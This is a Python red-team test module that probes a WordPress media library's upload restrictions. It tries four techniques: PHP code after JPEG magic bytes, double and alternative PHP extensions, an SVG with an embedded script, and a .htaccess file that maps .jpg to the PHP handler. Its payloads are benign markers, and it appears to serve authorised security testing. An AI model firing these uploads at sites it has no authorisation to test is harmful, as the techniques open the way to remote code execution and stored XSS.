"""WordPress file upload vulnerability tests.

Tests media library upload restrictions for dangerous file types
including PHP-in-image injection, double extensions, SVG XSS,
and .htaccess upload attempts.
"""

import time

from redteam.base import Attack, AttackResult, Severity, Status


BOUNDARY = "----RedTeamBoundary"


def _build_multipart(filename: str, content: bytes, content_type: str) -> tuple[str, bytes]:
    """Build a multipart/form-data body for file upload.

    Returns (content_type_header, body_bytes).
    """
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n"
        f"\r\n"
    ).encode() + content + f"\r\n--{BOUNDARY}--\r\n".encode()

    header = f"multipart/form-data; boundary={BOUNDARY}"
    return header, body


class FileUploadAttack(Attack):
    name = "wordpress.file_upload"
    category = "wordpress"
    severity = Severity.HIGH
    description = "WordPress media library upload restriction bypass"
    target_types = {"wordpress"}

    MEDIA_ENDPOINT = "/wp/v2/media"

    async def execute(self, client) -> list[AttackResult]:
        results = []
        results.append(await self._php_in_image(client))
        results.extend(await self._double_extension(client))
        results.append(await self._svg_xss(client))
        results.append(await self._htaccess_upload(client))
        return results

    # ------------------------------------------------------------------
    # Helper: upload via REST media endpoint
    # ------------------------------------------------------------------
    async def _upload_file(
        self, client, filename: str, content: bytes, content_type: str
    ) -> tuple[int, str, dict, float]:
        """Upload a file to the WP REST media endpoint.

        Returns (status_code, body, headers, duration_ms).
        """
        ct_header, body_bytes = _build_multipart(filename, content, content_type)

        upload_headers = {"Content-Type": ct_header}
        if client._wp_nonce:
            upload_headers["X-WP-Nonce"] = client._wp_nonce

        start = time.monotonic()
        status_code, body, headers = await client.post(
            f"{client.rest_prefix}{self.MEDIA_ENDPOINT}",
            raw_body=body_bytes.decode("latin-1"),
            headers=upload_headers,
        )
        duration = (time.monotonic() - start) * 1000
        return status_code, body, headers, duration

    # ------------------------------------------------------------------
    # Variant 1: PHP code embedded in JPEG header
    # ------------------------------------------------------------------
    async def _php_in_image(self, client) -> AttackResult:
        """Upload a file with JPEG magic bytes followed by PHP code.

        Uses filename 'test.php.jpg' to attempt extension confusion.
        VULNERABLE if accepted and the file is accessible.
        """
        # JPEG SOI + APP0 marker followed by PHP payload
        jpeg_header = b"\xff\xd8\xff\xe0"
        php_payload = b'<?php echo "RCE"; ?>'
        content = jpeg_header + php_payload
        filename = "test.php.jpg"

        try:
            status_code, body, headers, duration = await self._upload_file(
                client, filename, content, "image/jpeg",
            )
        except Exception as e:
            return self._make_result(
                variant="php_in_image",
                status=Status.ERROR,
                evidence=str(e),
                details="Exception during PHP-in-image upload",
            )

        # Check if file was accepted
        uploaded = status_code in (200, 201)
        body_lower = body.lower()
        has_url = "source_url" in body_lower or "link" in body_lower

        if uploaded and has_url:
            status = Status.VULNERABLE
            evidence = (
                f"PHP-embedded JPEG accepted (HTTP {status_code}). "
                "File with PHP code stored in media library"
            )
        elif uploaded:
            status = Status.PARTIAL
            evidence = f"File accepted (HTTP {status_code}) but URL not confirmed in response"
        elif status_code in (400, 403):
            status = Status.DEFENDED
            evidence = f"Upload rejected (HTTP {status_code})"
        elif status_code == 401:
            status = Status.DEFENDED
            evidence = "Upload requires authentication (401)"
        else:
            status = Status.DEFENDED
            evidence = f"Upload returned HTTP {status_code}"

        return self._make_result(
            variant="php_in_image",
            status=status,
            evidence=evidence,
            details=(
                f"Uploaded {filename} with JPEG header + PHP code. "
                f"Response: {status_code}"
            ),
            request={"filename": filename, "content_type": "image/jpeg", "payload": "JPEG+PHP"},
            response={"status": status_code, "body": body[:400]},
            duration_ms=duration,
        )

    # ------------------------------------------------------------------
    # Variant 2: Double/alternative extensions
    # ------------------------------------------------------------------
    async def _double_extension(self, client) -> list[AttackResult]:
        """Upload files with dangerous double or alternative extensions.

        Tests: .php.jpg, .phtml, .php5, .php.png
        VULNERABLE if any are accepted.
        """
        test_files = [
            ("test.php.jpg", "image/jpeg"),
            ("test.phtml", "application/x-httpd-php"),
            ("test.php5", "application/x-httpd-php"),
            ("test.php.png", "image/png"),
        ]
        php_content = b"<?php phpinfo(); ?>"
        results = []

        for filename, content_type in test_files:
            try:
                status_code, body, headers, duration = await self._upload_file(
                    client, filename, php_content, content_type,
                )
            except Exception as e:
                results.append(self._make_result(
                    variant=f"double_extension_{filename}",
                    status=Status.ERROR,
                    evidence=str(e),
                    details=f"Exception uploading {filename}",
                ))
                continue

            uploaded = status_code in (200, 201)

            results.append(self._make_result(
                variant=f"double_extension_{filename}",
                status=Status.VULNERABLE if uploaded else Status.DEFENDED,
                evidence=(
                    f"Dangerous file '{filename}' accepted by media library"
                    if uploaded
                    else f"Upload of '{filename}' rejected (HTTP {status_code})"
                ),
                details=f"Attempted upload of {filename} as {content_type}",
                request={"filename": filename, "content_type": content_type},
                response={"status": status_code, "body": body[:300]},
                duration_ms=duration,
            ))

        return results

    # ------------------------------------------------------------------
    # Variant 3: SVG with embedded XSS
    # ------------------------------------------------------------------
    async def _svg_xss(self, client) -> AttackResult:
        """Upload an SVG containing a script tag.

        SVG files can contain JavaScript that executes when viewed in a browser.
        VULNERABLE if SVG accepted (enables stored XSS).
        """
        svg_content = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
            "  <script>alert('XSS')</script>\n"
            "  <circle cx='50' cy='50' r='40' fill='red'/>\n"
            "</svg>"
        ).encode()

        try:
            status_code, body, headers, duration = await self._upload_file(
                client, "redteam-test.svg", svg_content, "image/svg+xml",
            )
        except Exception as e:
            return self._make_result(
                variant="svg_xss",
                status=Status.ERROR,
                evidence=str(e),
                details="Exception during SVG upload",
            )

        uploaded = status_code in (200, 201)

        if uploaded:
            status = Status.VULNERABLE
            evidence = (
                f"SVG with embedded JavaScript accepted (HTTP {status_code}). "
                "Stored XSS possible when SVG is viewed"
            )
        elif status_code in (400, 403):
            status = Status.DEFENDED
            evidence = f"SVG upload rejected (HTTP {status_code})"
        else:
            status = Status.DEFENDED
            evidence = f"SVG upload returned HTTP {status_code}"

        return self._make_result(
            variant="svg_xss",
            status=status,
            evidence=evidence,
            details=f"Uploaded SVG containing <script>alert('XSS')</script>",
            request={"filename": "redteam-test.svg", "content_type": "image/svg+xml"},
            response={"status": status_code, "body": body[:400]},
            duration_ms=duration,
        )

    # ------------------------------------------------------------------
    # Variant 4: .htaccess upload
    # ------------------------------------------------------------------
    async def _htaccess_upload(self, client) -> AttackResult:
        """Attempt to upload a .htaccess file via the media library.

        A successful upload could override Apache server configuration,
        enabling PHP execution in upload directories.
        VULNERABLE if accepted.
        """
        htaccess_content = (
            "# Red team test\n"
            "AddType application/x-httpd-php .jpg\n"
        ).encode()

        try:
            status_code, body, headers, duration = await self._upload_file(
                client, ".htaccess", htaccess_content, "text/plain",
            )
        except Exception as e:
            return self._make_result(
                variant="htaccess_upload",
                status=Status.ERROR,
                evidence=str(e),
                details="Exception during .htaccess upload",
            )

        uploaded = status_code in (200, 201)

        if uploaded:
            status = Status.VULNERABLE
            evidence = (
                f".htaccess accepted by media library (HTTP {status_code}). "
                "Attacker could override server configuration"
            )
        elif status_code in (400, 403):
            status = Status.DEFENDED
            evidence = f".htaccess upload rejected (HTTP {status_code})"
        else:
            status = Status.DEFENDED
            evidence = f".htaccess upload returned HTTP {status_code}"

        return self._make_result(
            variant="htaccess_upload",
            status=status,
            evidence=evidence,
            details="Attempted .htaccess upload to override Apache config in uploads dir",
            request={"filename": ".htaccess", "content_type": "text/plain"},
            response={"status": status_code, "body": body[:300]},
            duration_ms=duration,
        )
